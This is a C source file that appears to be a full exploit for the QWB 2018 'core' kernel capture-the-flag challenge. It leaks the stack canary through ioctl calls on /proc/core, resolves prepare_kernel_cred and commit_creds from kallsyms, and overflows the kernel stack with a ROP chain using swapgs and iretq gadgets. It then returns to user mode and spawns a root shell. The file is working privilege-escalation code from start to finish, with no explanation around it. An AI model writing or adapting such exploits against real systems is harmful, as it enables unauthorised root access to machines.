#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/stat.h>

size_t canary;
void leak_canary(int fd)
{
    size_t buf[8];
    puts("[+] set offset to 0x40.");
    ioctl(fd, 0x6677889C, 0x40);
    ioctl(fd, 0x6677889B, buf);
    canary = buf[0];
    printf("[+] leak canary: %p.\n", canary);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+] status has been saved.");
}


void spawn_shell()
{
    if (!getgid())
    {
        puts("[+] get root shell!");
        system("/bin/sh");
    }
    else
    {
        puts("[-] get root Failed!");
    }
    exit(0);
}

size_t vmlinux_base, prepare_kernel_cred, commit_creds;
size_t raw_vmlinux_base = 0xffffffff81000000;
/*
>>> vm = ELF('vmlinux')
[*] '/$$$$$/$$$$$$$/$$$$$$$$$/$$$/$$$$$$$$$$/qwb2018_core/give_to_player/vmlinux'
    Arch:     amd64-64-little
    Version:  4.15.8
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments
*/
void find_symbols()
{
    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
    if (kallsyms_fd < 0)
    {
        puts("[-] open kallsyms error.");
        exit(0);
    }
    char buf[0x30] = {0};
    while (fgets(buf, 0x30, kallsyms_fd))
    {
        if (prepare_kernel_cred & commit_creds)
            return;
        if (strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            char hex[0x20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%lx", &prepare_kernel_cred);
            printf("[+] prepare_kernel_cred addr: %lx\n", prepare_kernel_cred);
            /*
                >>> hex(vm.sym['prepare_kernel_cred'] - 0xffffffff81000000)
                '0x9cce0'
            */
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
            printf("[+] vmlinux_base addr: %lx\n", vmlinux_base);
        }
        if (strstr(buf, "commit_creds") && !commit_creds)
        {
            char hex[0x20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%lx", &commit_creds);
            printf("[+] commit_creds addr: %lx\n", commit_creds);
            /*
                >>> hex(vm.sym['commit_creds'] - 0xffffffff81000000)
                '0x9c8e0'
            */
            vmlinux_base = commit_creds - 0x9c8e0;
            printf("[+] vmlinux_base addr: %lx\n", vmlinux_base);
        }
    }
    if (!prepare_kernel_cred || !commit_creds)
    {
        puts("[-] can't find symbos.");
        exit(0);
    }
}


void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    // 内核态不能调用puts函数，这个是libc实现的。
    // puts("[+] root now!");
}


int main()
{
    save_status();
    find_symbols();
    int fd = open("/proc/core", O_RDWR);
    if (fd < 0)
    {
        puts("[-] open /proc/core error!");
        exit(0);
    }
    leak_canary(fd);
    size_t offset = vmlinux_base - raw_vmlinux_base;
    printf("[+] offset: %lx\n", offset);
    size_t rop_chain[0x20] = {0};
    int i = 10;
    rop_chain[8] = canary;
    rop_chain[i++] = (size_t)get_root;
    rop_chain[i++] = offset + 0xffffffff81a012da;           // swapgs ; popfq ; ret
    rop_chain[i++] = 0;
    rop_chain[i++] = offset + 0xffffffff81050ac2;           // iretq; ret
    rop_chain[i++] = (size_t)spawn_shell;                   // rip
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp;
    rop_chain[i++] = user_ss;

    write(fd, rop_chain, 0x100);
    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | 0x100);      // stack overflow
    return 0;
}
